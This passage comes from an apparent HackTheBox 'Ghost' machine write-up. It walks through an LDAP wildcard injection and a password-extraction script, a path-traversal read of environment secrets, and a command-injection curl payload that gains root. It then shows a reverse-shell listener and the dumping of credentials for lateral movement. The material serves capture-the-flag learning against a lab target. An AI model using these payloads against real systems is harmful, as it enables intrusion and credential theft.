class="punctuation">: </span>intranet.ghost.htb:8008</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>833</span><br><span class="line"><span class="attribute">Next-Action</span><span class="punctuation">: </span>c471eb076ccac91d6f828b671795550fd5925940</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/x-component</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryEDsVbrSRRZCpBB25</span><br><span class="line"><span class="attribute">Next-Router-State-Tree</span><span class="punctuation">: </span>%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.6</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://intranet.ghost.htb:8008</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://intranet.ghost.htb:8008/login</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_REF_1</span>&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_1</span>:0&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;c471eb076ccac91d6f828b671795550fd5925940&quot;</span>,<span class="string">&quot;bound&quot;</span>:<span class="string">&quot;$@1&quot;</span>&#125;</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_1</span>:1&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">[&#123;&#125;]</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_KEY</span>&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">k2982904007</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_ldap-username&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">kujen</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_ldap-secret&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">kujen</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;0&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">[&#123;&#125;,<span class="string">&quot;$K1&quot;</span>]</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25--</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br></pre></td></tr></table></figure></div>

<p>And this is the one with our injection:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>intranet.ghost.htb:8008</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>833</span><br><span class="line"><span class="attribute">Next-Action</span><span class="punctuation">: </span>c471eb076ccac91d6f828b671795550fd5925940</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/x-component</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryEDsVbrSRRZCpBB25</span><br><span class="line"><span class="attribute">Next-Router-State-Tree</span><span class="punctuation">: </span>%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.6</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://intranet.ghost.htb:8008</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://intranet.ghost.htb:8008/login</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_REF_1</span>&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_1</span>:0&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;c471eb076ccac91d6f828b671795550fd5925940&quot;</span>,<span class="string">&quot;bound&quot;</span>:<span class="string">&quot;$@1&quot;</span>&#125;</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_1</span>:1&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">[&#123;&#125;]</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_$<span class="type">ACTION_KEY</span>&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">k2982904007</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_ldap-username&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">*</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;1_ldap-secret&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">*</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;0&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell">[&#123;&#125;,<span class="string">&quot;$K1&quot;</span>]</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryEDsVbrSRRZCpBB25--</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br></pre></td></tr></table></figure></div>

<p>And we are in!!<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/intranet1.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>We can see this from the <code>new</code> page:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We are currently migrating Gitea to Bitbucket.</span><br><span class="line">Domain logins to Gitea have been disabled.</span><br><span class="line">You can only login with the gitea_temp_principal account and its corresponding intranet token as password.</span><br></pre></td></tr></table></figure></div>

<p>This means that there is also a <code>Gitea</code> instance with a <code>gitea_temp_principal</code> user. Letâ€™s add that entry to our <code>/etc/hosts</code> and check it out.</p>
<h3 id="Web-Application-http-gitea-ghost-htb-8008"><a href="#Web-Application-http-gitea-ghost-htb-8008" class="headerlink" title="Web Application - http://gitea.ghost.htb:8008"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://gitea.ghost.htb:8008/" >http://gitea.ghost.htb:8008 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/gitea.png"
                      alt="Gitea Web Application"
                ><figcaption>Gitea Web Application</figcaption></figure></p>
<p>We are here. However, we only have a username for the login without any clue for the password. </p>
<p>However, we had this note after loggin in to intranet : <code>For sysadmins: Look in LDAP for the attribute. You can also test the credentials by logging in to intranet.</code> So letâ€™s try bruteforcing the <code>gitea_temp_principal</code>password from there.</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://intranet.ghost.htb:8008/login&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;intranet.ghost.htb:8008&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Next-Action&#x27;</span>: <span class="string">&#x27;c471eb076ccac91d6f828b671795550fd5925940&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;1_ldap-username&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;gitea_temp_principal&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;1_ldap-secret&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;*&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;[&#123;&#125;,&quot;$K1&quot;]&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> string.ascii_lowercase + string.digits:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;1_ldap-username&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;gitea_temp_principal&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;1_ldap-secret&#x27;</span>: (<span class="literal">None</span>, <span class="string">f&#x27;<span class="subst">&#123;passwd&#125;</span><span class="subst">&#123;_&#125;</span>*&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;0&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;[&#123;&#125;,&quot;$K1&quot;]&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.post(url, headers=headers, files=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">303</span>:</span><br><span class="line">            passwd += _</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Passwd: <span class="subst">&#123;passwd&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure></div>

<p>And we actually got it:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; python3 .\gitea_bruteforce.py</span><br><span class="line">Passwd: s</span><br><span class="line">Passwd: sz</span><br><span class="line">Passwd: szr</span><br><span class="line">Passwd: szrr</span><br><span class="line">Passwd: szrr8</span><br><span class="line">Passwd: szrr8k</span><br><span class="line">Passwd: szrr8kp</span><br><span class="line">Passwd: szrr8kpc</span><br><span class="line">Passwd: szrr8kpc3</span><br><span class="line">Passwd: szrr8kpc3z</span><br><span class="line">Passwd: szrr8kpc3z6</span><br><span class="line">Passwd: szrr8kpc3z6o</span><br><span class="line">Passwd: szrr8kpc3z6on</span><br><span class="line">Passwd: szrr8kpc3z6onl</span><br><span class="line">Passwd: szrr8kpc3z6onlq</span><br><span class="line">Passwd: szrr8kpc3z6onlqf</span><br></pre></td></tr></table></figure></div>

<p><code>gitea_temp_principal:szrr8kpc3z6onlqf</code></p>
<p>Letâ€™s login to gitea now:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/gitea1.png"
                      alt="Gitea Web Application"
                ><figcaption>Gitea Web Application</figcaption></figure></p>
<p>We can see we have <code>blog</code> and <code>intranet</code> projects.</p>
<h3 id="Gitea-Blog-project-Local-File-Inclusion"><a href="#Gitea-Blog-project-Local-File-Inclusion" class="headerlink" title="Gitea Blog project - Local File Inclusion"></a>Gitea Blog project - Local File Inclusion</h3><p>Looking closely at the blog js code, we find this interesting snippet:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/lfi.png"
                      alt="Local File Inclusion"
                ><figcaption>Local File Inclusion</figcaption></figure></p>
<p>the <code>extra</code> parameter is directly used to read a file without sanitization which can lead to lfi.<br>Letâ€™s leave this for later.</p>
<h3 id="Gitea-Intranet-Project-X-DEV-INTRANET-KEY"><a href="#Gitea-Intranet-Project-X-DEV-INTRANET-KEY" class="headerlink" title="Gitea Intranet Project - X-DEV-INTRANET-KEY"></a>Gitea Intranet Project - X-DEV-INTRANET-KEY</h3><p>Looking at <a class="link"   target="_blank" rel="noopener" href="http://gitea.ghost.htb:8008/ghost-dev/intranet/src/branch/main/backend/src/api/dev/scan.rs" >http://gitea.ghost.htb:8008/ghost-dev/intranet/src/branch/main/backend/src/api/dev/scan.rs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, we can directly see a red flag:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/rce.png"
                      alt="Gitea Intranet Project"
                ><figcaption>Gitea Intranet Project</figcaption></figure></p>
<p>The <code>url</code> is being directly passed into the shell command without sanitization which can lead to RCE (Remote Code Execution).<br>Also looking at the imports in this file we can see <code>use crate::api::dev::DevGuard;</code> which leads us to <a class="link"   target="_blank" rel="noopener" href="http://gitea.ghost.htb:8008/ghost-dev/intranet/src/branch/main/backend/src/api/dev.rs" >dev.rs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where we can see that we require a <code>X-DEV-INTRANET-KEY</code> header to be able to make the request:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/rce1.png"
                      alt="Gitea Intranet Project"
                ><figcaption>Gitea Intranet Project</figcaption></figure></p>
<p>However, this key is stored inside the environment variables, which we can get using the LFI ;) </p>
<h3 id="Chaining-Local-File-Inclusion-to-get-RCE"><a href="#Chaining-Local-File-Inclusion-to-get-RCE" class="headerlink" title="Chaining Local File Inclusion to get RCE"></a>Chaining Local File Inclusion to get RCE</h3><p>Now letâ€™s abuse our LFI through this link where we abuse the <code>extra</code> parameter to get a hold of our environment variables:<br><a class="link"   target="_blank" rel="noopener" href="http://ghost.htb:8008/ghost/api/content/posts/?key=37395e9e872be56438c83aaca6&extra=../../../../proc/self/environ" >http://ghost.htb:8008/ghost/api/content/posts/?key=37395e9e872be56438c83aaca6&amp;extra=../../../../proc/self/environ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>And we can instantly see our header key <code>DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe</code> </p>
<p>Now letâ€™s test our RCE:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H <span class="string">&#x27;X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;url&quot;:&quot;;id&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;is_safe&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;temp_command_success&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;temp_command_stdout&quot;</span>:<span class="string">&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;</span>,<span class="string">&quot;temp_command_stderr&quot;</span>:<span class="string">&quot;bash: line 1: intranet_url_check: command not found\n&quot;</span>&#125;kujen@kujen:~$</span><br></pre></td></tr></table></figure></div>

<p>And we got it!!!!<br>Letâ€™s now use this to get a reverse shell on system:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.25] from (UNKNOWN) [10.129.231.105] 49848</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># hostname</span></span><br><span class="line"><span class="string">36b733906694</span></span><br></pre></td></tr></table></figure></div>

<p>And we are in!!</p>
<h3 id="Lateral-Movement-florence-ramirez"><a href="#Lateral-Movement-florence-ramirez" class="headerlink" title="Lateral Movement - florence.ramirez"></a>Lateral Movement - florence.ramirez</h3><p>Checking the environment we are in, we can first check our environment variable for anything interesting:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># env</span><br><span class="line">DATABASE_URL=./database.sqlite</span><br><span class="line">ROCKET_ADDRESS=0.0.0.0</span><br><span class="line">HOSTNAME=36b733906694</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/root</span><br><span class="line">OLDPWD=/app</span><br><span class="line">LDAP_HOST=ldap://windows-host:389</span><br><span class="line">DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe</span><br><span class="line">_=klist</span><br><span class="line">RUSTUP_HOME=/usr/local/rustup</span><br><span class="line">LDAP_BIND_DN=CN=Intranet Principal,CN=Users,DC=ghost,DC=htb</span><br><span class="line">PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">JWT_SECRET=*xopkAGbLyg9bK_A</span><br><span class="line">RUST_VERSION=1.79.0</span><br><span class="line">PWD=/</span><br><span class="line">LDAP_BIND_PASSWORD=He!KA9oKVT3rL99j</span><br><span class="line">CARGO_HOME=/usr/local/cargo</span><br></pre></td></tr></table></figure></div>
<p>We could also check our <code>docker-entrypoint.sh</code> bash script under <code>/</code>:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat docker-entrypoint.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh</span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh/controlmaster</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes&#x27;</span> &gt; /root/.ssh/config</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /app/ghost_intranet</span><br></pre></td></tr></table></figure></div>

<p>Letâ€™s find and read that <code>controlmaster</code> file:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find / -name *controlmaster* 2&gt; /dev/null</span></span><br><span class="line">/root/.ssh/controlmaster</span><br><span class="line"><span class="comment"># ls /root/.ssh/controlmaster</span></span><br><span class="line">florence.ramirez@ghost.htb@dev-workstation:22</span><br><span class="line"><span class="comment"># cd /root/.ssh/controlmaster</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">florence.ramirez@ghost.htb@dev-workstation:22</span><br><span class="line"><span class="comment"># file florence.ramirez@ghost.htb@dev-workstation:22</span></span><br><span class="line">florence.ramirez@ghost.htb@dev-workstation:22: socket</span><br></pre></td></tr></table></figure></div>

<p>We can finda <code>florence.ramirez@ghost.htb@dev-workstation:22</code> socket file probably used to allow <code>florence.ramirez</code> user to connect to this docker environment.<br>Letâ€™s execute the bash docker entrypoint file and see what we get:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bash docker-entrypoint.sh</span></span><br><span class="line"><span class="built_in">mkdir</span>: cannot create directory <span class="string">&#x27;/root/.ssh&#x27;</span>: File exists</span><br><span class="line"><span class="built_in">mkdir</span>: cannot create directory <span class="string">&#x27;/root/.ssh/controlmaster&#x27;</span>: File exists</span><br><span class="line">Error: Rocket failed to <span class="built_in">bind</span> network socket to given address/port.</span><br><span class="line">thread <span class="string">&#x27;main&#x27;</span> panicked at /usr/local/cargo/registry/src/index.crates.io-6f17d22bba15001f/rocket-0.5.1/src/error.rs:279:9:</span><br><span class="line">aborting due to socket <span class="built_in">bind</span> error</span><br><span class="line">note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace</span><br><span class="line"><span class="comment"># env</span></span><br><span class="line">DATABASE_URL=./database.sqlite</span><br><span class="line">ROCKET_ADDRESS=0.0.0.0</span><br><span class="line">HOSTNAME=36b733906694</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/root</span><br><span class="line">OLDPWD=/app</span><br><span class="line">LDAP_HOST=ldap://windows-host:389</span><br><span class="line">DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe</span><br><span class="line">_=docker-entrypoint.sh</span><br><span class="line">RUSTUP_HOME=/usr/local/rustup</span><br><span class="line">LDAP_BIND_DN=CN=Intranet Principal,CN=Users,DC=ghost,DC=htb</span><br><span class="line">PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">JWT_SECRET=*xopkAGbLyg9bK_A</span><br><span 